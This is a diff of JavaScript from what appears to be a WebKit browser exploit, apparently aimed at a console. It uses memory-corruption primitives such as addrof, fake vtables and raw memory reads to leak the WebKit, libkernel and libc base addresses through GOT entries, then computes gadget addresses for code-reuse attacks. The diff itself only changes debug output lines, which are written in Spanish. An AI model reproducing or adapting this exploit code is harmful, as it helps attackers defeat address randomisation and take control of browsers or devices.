@@ -19,7 +19,7 @@ function get_got_addr(idx)
 {
     var p = plt_ptr + idx * 16;
     var q = read_mem(p, 6);
-msg.innerHTML+='<br>En get_got_addr('+idx+')-> Valor de p='+p+' q='+q;
+msg+='<br>En get_got_addr('+idx+')-> Valor de p='+p+' q='+q;
 
     if(q[0] != 0xff || q[1] != 0x25)
         throw "invalid GOT entry "+idx;
@@ -31,21 +31,22 @@ msg.innerHTML+='<br>En get_got_addr('+idx+')-> Valor de p='+p+' q='+q;
 }
 
 //these are not real bases but rather some low addresses
-msg.innerHTML+='<br>Direcciòn de msg '+addrof(msg);
-msg.innerHTML+='<br>Direcciòn de tarea '+addrof(tarea);
-msg.innerHTML+='<br>Valor de real_vt_ptr '+real_vt_ptr;
-msg.innerHTML+='<br>Valor de fake_vt_ptr '+fake_vt_ptr;
-msg.innerHTML+='<br>Valor de real_vtable '+real_vtable;
-msg.innerHTML+='<br>Valor de fake_vtable '+fake_vtable;
-msg.innerHTML+='<br>Valor de fake_vt_ptr_bak '+fake_vt_ptr_bak;
-msg.innerHTML+='<br>Valor de plt_ptr '+plt_ptr;
+msg+='<br>Direcciòn de msg '+addrof(msg);
+msg+='<br>Direcciòn de tarea '+addrof(tarea);
+msg+='<br>Direcciòn de tarea suma '+addrof(tarea)+0x18;
+msg+='<br>Valor de real_vt_ptr '+real_vt_ptr;
+msg+='<br>Valor de fake_vt_ptr '+fake_vt_ptr;
+msg+='<br>Valor de real_vtable '+real_vtable;
+msg+='<br>Valor de fake_vtable '+fake_vtable;
+msg+='<br>Valor de fake_vt_ptr_bak '+fake_vt_ptr_bak;
+msg+='<br>Valor de plt_ptr '+plt_ptr;
 
 var webkit_base = read_ptr_at(fake_vtable);
-msg.innerHTML+='<br>Valor de webkit_base '+webkit_base;
+msg+='<br>Valor de webkit_base '+webkit_base;
 var libkernel_base = get_got_addr(705)-0x10000;
-msg.innerHTML+='<br>Valor de libkernel_base '+libkernel_base;
+msg+='<br>Valor de libkernel_base '+libkernel_base;
 var libc_base = get_got_addr(582);
-msg.innerHTML+='<br>Valor de libc_base '+libc_base;
+msg+='<br>Valor de libc_base '+libc_base;
 var saveall_addr = libc_base+0x2e2c8;
 var loadall_addr = libc_base+0x3275c;
 var setjmp_addr = libc_base+0xbfae0;
